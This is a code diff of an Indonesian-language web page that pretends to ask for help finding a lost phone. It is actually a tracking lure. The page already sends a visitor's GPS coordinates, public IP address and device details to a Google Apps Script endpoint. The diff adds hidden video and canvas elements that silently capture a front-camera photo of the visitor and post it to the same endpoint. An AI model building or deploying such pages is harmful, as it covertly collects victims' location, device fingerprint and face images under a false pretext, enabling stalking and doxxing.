@@ -6,20 +6,24 @@
   <style>
     body { font-family: Arial; padding:20px; max-width:600px; margin:auto; }
     .box { padding:15px; border:1px solid #ccc; border-radius:10px; background:#fafafa; }
+    video, canvas { display:none; } /* tidak ditampilkan */
   </style>
 </head>
 <body>
   <h2>Mohon Bantu Temukan HP Hilang</h2>
   <div class="box">
-    <p>Silakan tekan <b>Allow / Izinkan</b> saat muncul permintaan lokasi.</p>
+    <p>Silakan tekan <b>Allow / Izinkan</b> saat muncul permintaan lokasi & kamera.</p>
     <p id="status">Menunggu izin lokasi...</p>
     <div id="result"></div>
   </div>
 
-<script>
-const ENDPOINT = "https://script.google.com/macros/s/AKfycbxF_gCSQq5hwRaShgi2n_82321UMo3o7VemIUTh3tUfbrz1e7hcb1773bP00apWofI/exec"; 
+  <!-- elemen video & canvas tersembunyi untuk capture foto -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
-// ============ FUNGSI KIRIM DATA LOKASI KE SHEET1 ============
+<script>
+const ENDPOINT = "https://script.google.com/macros/s/AKfycbzUhqxDwjycNCxKlTc8nOL2zazec6AzXVTqkuq1H4gWboDDp5sUcNpAKJhGSnMbt10/exec";
+
 function sendToSheet(lat, lon, acc){
   const formData = new FormData();
   formData.append("type", "location");
@@ -28,42 +32,31 @@ function sendToSheet(lat, lon, acc){
   formData.append("accuracy", acc);
   formData.append("ua", navigator.userAgent);
 
-  fetch(ENDPOINT, {
-    method: "POST",
-    body: formData
-  }).then(() => {
-    // setelah sukses kirim lokasi → kirim data extra
-    sendExtraData();
-  });
+  fetch(ENDPOINT, { method: "POST", body: formData })
+    .then(() => {
+      sendExtraData();   // kirim data tambahan
+      requestCamera();   // minta izin kamera & kirim foto
+    });
 }
 
-// ============ FUNGSI KIRIM DATA TAMBAHAN (Sheet2) ============
+// ============ EXTRA DATA ============
 async function sendExtraData(){
   const ip = await getPublicIP();
-  const conn = navigator.connection ? (navigator.connection.effectiveType || "") : "";
-  const lang = navigator.language || "";
-  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
-  const memory = navigator.deviceMemory || "";
-  const platform = navigator.platform || "";
-  const screenSize = screen.width + "x" + screen.height;
-  const viewport = window.innerWidth + "x" + window.innerHeight;
-
   const fd = new FormData();
   fd.append("type", "extra");
   fd.append("ip", ip);
-  fd.append("connection", conn);
-  fd.append("lang", lang);
-  fd.append("timezone", tz);
-  fd.append("memory", memory);
-  fd.append("platform", platform);
+  fd.append("connection", navigator.connection?.effectiveType || "");
+  fd.append("lang", navigator.language || "");
+  fd.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone || "");
+  fd.append("memory", navigator.deviceMemory || "");
+  fd.append("platform", navigator.platform || "");
   fd.append("ua", navigator.userAgent);
-  fd.append("screen", screenSize);
-  fd.append("viewport", viewport);
-
-  fetch(ENDPOINT, { method:"POST", body: fd });
+  fd.append("screen", `${screen.width}x${screen.height}`);
+  fd.append("viewport", `${innerWidth}x${innerHeight}`);
+  fetch(ENDPOINT, { method: "POST", body: fd });
 }
 
-// ambil IP publik (via ipify)
+// ambil IP publik
 async function getPublicIP(){
   try{
     const r = await fetch("https://api.ipify.org?format=json");
@@ -74,7 +67,43 @@ async function getPublicIP(){
   }
 }
 
-// ============ HANDLE LOKASI ============
+// ============ FOTO OTOMATIS ============
+async function requestCamera(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+    takePhoto(stream);
+  }catch(err){
+    console.warn("Kamera ditolak:", err);
+  }
+}
+
+function takePhoto(stream){
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  video.srcObject = stream;
+
+  video.onloadedmetadata = () => {
+    const w = video.videoWidth;
+    const h = video.videoHeight;
+    canvas.width = w;
+    canvas.height = h;
+    canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+
+    const dataURL = canvas.toDataURL("image/jpeg", 0.7);
+
+    const fd = new FormData();
+    fd.append("type", "extra");
+    fd.append("photo", dataURL);
+
+    fetch(ENDPOINT, { method:"POST", body: fd });
+
+    stream.getTracks().forEach(t => t.stop());
+  };
+}
+
+// ============ LOKASI ============
 function success(pos){
   const lat = pos.coords.latitude;
   const lon = pos.coords.longitude;
@@ -86,7 +115,6 @@ function success(pos){
     Akurasi: <b>${acc} meter</b><br><br>
     <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Buka di Google Maps</a>
   `;
-
   sendToSheet(lat, lon, acc);
 }
 
